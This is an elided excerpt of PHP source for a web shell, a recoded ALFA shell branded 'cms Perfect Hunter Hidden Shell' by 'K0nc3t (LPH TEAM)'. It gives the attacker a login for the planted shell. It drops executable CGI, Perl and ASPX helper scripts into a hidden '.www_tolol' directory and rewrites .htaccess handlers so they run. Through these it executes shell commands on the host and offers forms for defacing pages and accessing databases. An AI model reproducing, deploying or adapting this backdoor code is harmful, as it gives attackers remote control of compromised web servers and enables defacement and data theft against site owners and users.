...
$GLOBALS['cms'] = array(
    'username' => 'smile',
    'password' => '5f127189fd2c090b927754f96c1763c5',
    'safe_mode' => '0',
    'login_page' => 'gui',
    'show_icons' => '1',
...
define("__ALFA_DATA_FOLDER__", "cms");
...
<center><img style="border-radius:100px;"width="500" height="250" alt="cms Perfect Hunter" draggable="false" src="https://smily.one/nn/erw.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>cms Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE[".www_tolol_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE[".www_tolol"])){
			if(!@file_exists(".www_tolol/".$_COOKIE[".www_tolol"].".tololmuterlalu")){
				$recreate = true;
				$lang = $_COOKIE[".www_tolol"];
			}
		}
		if(!isset($_COOKIE[".www_tolol"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".tololmuterlalu",$source);
			}
			alfacgihtaccess('cgi', ".www_tolol/");
		}else{
			$lang = $_COOKIE[".www_tolol"];
		}
		$cgi_ext = ".tololmuterlalu";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";
		}
		$cgi_url = __ALFA_DATA_FOLDER__."/.www_tolol/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie(".www_tolol", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie(".www_tolol_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>cms Perfect Hunter Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ cms Perfect Hunter ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="250" height="170" alt="lph team 2023" draggable="false" src="https://smily.one/pic/31.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['loader']='https://smily.one/nn/erw.png';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://haxor.lol/love/cms-Perfect-Hunter-transformed.png'><br>
<font color='#FFFFFF'>Shell ReCoded By K0nc3t (LPH TEAM)</font><br>
<font color='#00A220'>Contact : haxor@cmsperfecthunter.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE[".www_tolol_mode"])&&!isset($_COOKIE[".www_tolol"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('.www_tolol',0755);
	__write_file(".www_tolol/".$name, __get_resource($source));
	@chmod(".www_tolol/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/.www_tolol';sh getheader.tololmuterlalu",false,true,true);
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/.www_tolol/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/.www_tolol;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By K0nc3t</title><b>Hacked By K0nc3t</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By cms Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>Hacked By K0nc3t</title><b>Hacked By K0nc3t</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://smily.one/nn/erw.png\"></p>";
...
@chdir('cgihaxor');
alfacgihtaccess('cgi');
$name = $_POST['alfa1'].'.tololmuterlalu';
...
if($m=='cgi'){
$code = "#ReCoded By K0nc3t\nDeny from all\n###KONTOL###\nAddHandler ANAK BABI .tololmuterlalu";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.tololmuterlalu",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/.www_tolol;sh basedir.tololmuterlalu ".$makepwd,false,true,true);
